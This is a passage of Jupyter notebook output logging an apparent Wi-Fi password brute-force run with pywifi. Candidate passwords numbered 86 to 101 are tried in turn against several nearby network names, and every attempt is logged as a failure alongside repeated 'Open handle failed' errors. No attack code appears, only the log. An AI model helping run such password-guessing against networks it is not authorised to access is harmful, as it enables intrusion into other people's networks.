      "pywifi 2020-05-03 03:34:14,632 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 86 Fail Current WifiName: Ruoshui317 Current Password: Ucr552516\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:34:20,196 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 86 Fail Current WifiName: 311 Current Password: Ucr552516\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:34:25,209 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 86 Fail Current WifiName: 321sushe Current Password: Ucr552516\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:34:30,784 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 86 Fail Current WifiName: 313 Current Password: Ucr552516\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:34:36,353 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 87 Fail Current WifiName: BP2197 Current Password: 3295358Yie\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:34:41,920 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 87 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 3295358Yie\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:34:47,492 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 87 Fail Current WifiName: whhh Current Password: 3295358Yie\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:34:52,511 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 87 Fail Current WifiName: Ruoshui317 Current Password: 3295358Yie\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:34:58,086 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 87 Fail Current WifiName: 311 Current Password: 3295358Yie\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:35:03,107 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 87 Fail Current WifiName: 321sushe Current Password: 3295358Yie\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:35:08,685 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 87 Fail Current WifiName: 313 Current Password: 3295358Yie\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:35:14,257 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 88 Fail Current WifiName: BP2197 Current Password: UKx05832468\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:35:19,830 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 88 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: UKx05832468\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:35:25,400 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 88 Fail Current WifiName: whhh Current Password: UKx05832468\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:35:30,416 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 88 Fail Current WifiName: Ruoshui317 Current Password: UKx05832468\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:35:35,988 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 88 Fail Current WifiName: 311 Current Password: UKx05832468\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:35:41,009 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 88 Fail Current WifiName: 321sushe Current Password: UKx05832468\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:35:46,580 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 88 Fail Current WifiName: 313 Current Password: UKx05832468\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:35:52,149 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 89 Fail Current WifiName: BP2197 Current Password: 6035262hm\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:35:59,970 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 89 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 6035262hm\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:36:05,534 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 89 Fail Current WifiName: whhh Current Password: 6035262hm\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:36:10,560 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 89 Fail Current WifiName: Ruoshui317 Current Password: 6035262hm\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:36:16,133 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 89 Fail Current WifiName: 311 Current Password: 6035262hm\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:36:21,168 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 89 Fail Current WifiName: 321sushe Current Password: 6035262hm\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:36:26,760 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 89 Fail Current WifiName: 313 Current Password: 6035262hm\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:36:32,324 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 90 Fail Current WifiName: BP2197 Current Password: mvx9820488\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:36:37,896 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 90 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: mvx9820488\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:36:43,474 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 90 Fail Current WifiName: whhh Current Password: mvx9820488\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:36:48,492 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 90 Fail Current WifiName: Ruoshui317 Current Password: mvx9820488\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:36:54,065 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 90 Fail Current WifiName: 311 Current Password: mvx9820488\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:36:59,085 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 90 Fail Current WifiName: 321sushe Current Password: mvx9820488\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:37:04,660 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 90 Fail Current WifiName: 313 Current Password: mvx9820488\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:37:10,228 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 91 Fail Current WifiName: BP2197 Current Password: 32121342All\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:37:15,793 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 91 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 32121342All\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:37:21,358 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 91 Fail Current WifiName: whhh Current Password: 32121342All\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:37:26,377 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 91 Fail Current WifiName: Ruoshui317 Current Password: 32121342All\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:37:31,941 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 91 Fail Current WifiName: 311 Current Password: 32121342All\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:37:36,957 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 91 Fail Current WifiName: 321sushe Current Password: 32121342All\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:37:42,529 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 91 Fail Current WifiName: 313 Current Password: 32121342All\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:37:48,103 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 92 Fail Current WifiName: BP2197 Current Password: vJK3892666\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:37:53,686 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 92 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: vJK3892666\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:37:59,253 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 92 Fail Current WifiName: whhh Current Password: vJK3892666\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:38:04,266 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 92 Fail Current WifiName: Ruoshui317 Current Password: vJK3892666\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:38:09,837 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 92 Fail Current WifiName: 311 Current Password: vJK3892666\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:38:14,858 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 92 Fail Current WifiName: 321sushe Current Password: vJK3892666\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:38:20,444 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 92 Fail Current WifiName: 313 Current Password: vJK3892666\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:38:26,016 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 93 Fail Current WifiName: BP2197 Current Password: 385859CBw\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:38:31,594 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 93 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 385859CBw\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:38:37,169 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 93 Fail Current WifiName: whhh Current Password: 385859CBw\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:38:42,186 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 93 Fail Current WifiName: Ruoshui317 Current Password: 385859CBw\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:38:47,762 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 93 Fail Current WifiName: 311 Current Password: 385859CBw\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:38:52,784 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 93 Fail Current WifiName: 321sushe Current Password: 385859CBw\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:38:58,357 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 93 Fail Current WifiName: 313 Current Password: 385859CBw\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:39:03,931 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 94 Fail Current WifiName: BP2197 Current Password: mIe20155\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:39:09,496 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 94 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: mIe20155\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:39:15,071 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 94 Fail Current WifiName: whhh Current Password: mIe20155\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:39:20,092 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 94 Fail Current WifiName: Ruoshui317 Current Password: mIe20155\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:39:25,669 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 94 Fail Current WifiName: 311 Current Password: mIe20155\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:39:30,690 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 94 Fail Current WifiName: 321sushe Current Password: mIe20155\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:39:36,255 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 94 Fail Current WifiName: 313 Current Password: mIe20155\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:39:41,830 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 95 Fail Current WifiName: BP2197 Current Password: 4968859hue\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:39:47,404 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 95 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 4968859hue\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:39:52,974 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 95 Fail Current WifiName: whhh Current Password: 4968859hue\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:39:57,990 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 95 Fail Current WifiName: Ruoshui317 Current Password: 4968859hue\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:40:03,572 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 95 Fail Current WifiName: 311 Current Password: 4968859hue\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:40:08,595 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 95 Fail Current WifiName: 321sushe Current Password: 4968859hue\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:40:14,170 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 95 Fail Current WifiName: 313 Current Password: 4968859hue\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:40:19,742 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 96 Fail Current WifiName: BP2197 Current Password: Nh4036351\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:40:25,311 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 96 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: Nh4036351\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:40:30,885 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 96 Fail Current WifiName: whhh Current Password: Nh4036351\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:40:35,901 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 96 Fail Current WifiName: Ruoshui317 Current Password: Nh4036351\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:40:41,463 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 96 Fail Current WifiName: 311 Current Password: Nh4036351\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:40:46,480 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 96 Fail Current WifiName: 321sushe Current Password: Nh4036351\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:40:52,051 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 96 Fail Current WifiName: 313 Current Password: Nh4036351\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:40:57,629 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 97 Fail Current WifiName: BP2197 Current Password: 03366019iUf\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:41:03,200 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 97 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 03366019iUf\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:41:08,782 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 97 Fail Current WifiName: whhh Current Password: 03366019iUf\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:41:13,810 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 97 Fail Current WifiName: Ruoshui317 Current Password: 03366019iUf\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:41:19,385 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 97 Fail Current WifiName: 311 Current Password: 03366019iUf\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:41:24,949 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 97 Fail Current WifiName: 321sushe Current Password: 03366019iUf\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:41:30,522 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 97 Fail Current WifiName: 313 Current Password: 03366019iUf\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:41:36,090 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 99 Fail Current WifiName: BP2197 Current Password: 09499ciS\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:41:41,662 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 99 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 09499ciS\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:41:47,232 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 99 Fail Current WifiName: whhh Current Password: 09499ciS\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:41:52,250 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 99 Fail Current WifiName: Ruoshui317 Current Password: 09499ciS\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:41:57,838 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 99 Fail Current WifiName: 311 Current Password: 09499ciS\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:42:03,407 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 99 Fail Current WifiName: 321sushe Current Password: 09499ciS\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:42:08,982 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 99 Fail Current WifiName: 313 Current Password: 09499ciS\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:42:14,557 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 100 Fail Current WifiName: BP2197 Current Password: VE5376705\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:42:20,125 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 100 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: VE5376705\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:42:25,661 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 100 Fail Current WifiName: whhh Current Password: VE5376705\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:42:30,683 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 100 Fail Current WifiName: Ruoshui317 Current Password: VE5376705\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:42:36,254 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 100 Fail Current WifiName: 311 Current Password: VE5376705\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:42:41,828 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 100 Fail Current WifiName: 321sushe Current Password: VE5376705\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:42:47,401 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 100 Fail Current WifiName: 313 Current Password: VE5376705\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:42:52,976 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 101 Fail Current WifiName: BP2197 Current Password: 95829812TmM\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:42:58,561 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 101 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 95829812TmM\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:43:04,136 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 101 Fail Current WifiName: whhh Current Password: 95829812TmM\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:43:09,155 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 101 Fail Current WifiName: Ruoshui317 Current Password: 95829812TmM\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:43:14,730 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 101 Fail Current WifiName: 311 Current Password: 95829812TmM\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:43:20,306 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 101 Fail Current WifiName: 321sushe Current Password: 95829812TmM\n"
     ]
